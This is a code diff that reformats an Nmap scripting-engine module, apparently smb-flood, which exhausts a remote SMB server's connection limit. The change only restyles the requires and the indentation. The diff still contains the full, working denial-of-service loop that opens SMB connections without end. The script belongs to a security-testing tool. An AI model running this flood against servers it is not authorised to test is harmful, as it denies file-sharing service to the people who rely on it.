@@ -1,3 +1,7 @@
+local smb = require "smb"
+local stdnse = require "stdnse"
+local table = require "table"
+
 description = [[
 Exhausts a remote SMB server's connection limit by by opening as many
 connections as we can.  Most implementations of SMB have a hard global
@@ -32,25 +36,23 @@ license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = {"intrusive","dos"}
 dependencies = {"smb-brute"}
 
-require 'smb'
-require 'stdnse'
 
 hostrule = function(host)
-	return smb.get_port(host) ~= nil
+  return smb.get_port(host) ~= nil
 end
 
 action = function(host)
-	local states = {}
-	repeat
-		local status, result = smb.start_ex(host, true, true)
-		if(status) then
-			table.insert(states, result) -- Keep the result so it doesn't get garbage cleaned
-			stdnse.print_debug(1, "smb-flood: Connection successfully opened")
-			stdnse.sleep(.1)
-		else
-			stdnse.print_debug(1, "smb-flood: Connection failed: %s", result)
-			stdnse.sleep(1)
-		end
-	until false
+  local states = {}
+  repeat
+    local status, result = smb.start_ex(host, true, true)
+    if(status) then
+      table.insert(states, result) -- Keep the result so it doesn't get garbage cleaned
+      stdnse.print_debug(1, "smb-flood: Connection successfully opened")
+      stdnse.sleep(.1)
+    else
+      stdnse.print_debug(1, "smb-flood: Connection failed: %s", result)
+      stdnse.sleep(1)
+    end
+  until false
 end
 
